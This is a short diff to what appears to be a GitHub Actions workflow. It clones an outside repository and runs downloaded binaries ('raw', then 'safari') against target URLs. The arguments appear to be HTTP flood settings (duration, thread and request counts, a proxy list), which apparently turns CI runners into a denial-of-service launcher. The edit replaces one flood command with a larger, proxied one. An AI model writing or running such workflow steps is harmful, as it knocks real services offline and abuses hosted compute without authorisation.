@@ -23,7 +23,6 @@ jobs:
       run: |
         git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
         cd cuddly-octo-bassoon
-        chmod +x *
-        ./raw https://c3.dstatbot.win/Fu6im44k   700 1 700
-      continue-on-error: true
+        chmod +x safari
+        ./safari  https://countbot.lol/6901966783-da39f08e-196a-42f2-8ea4-bbc01e783e58   700 10000 8000 proxies.txt  --raw 
     
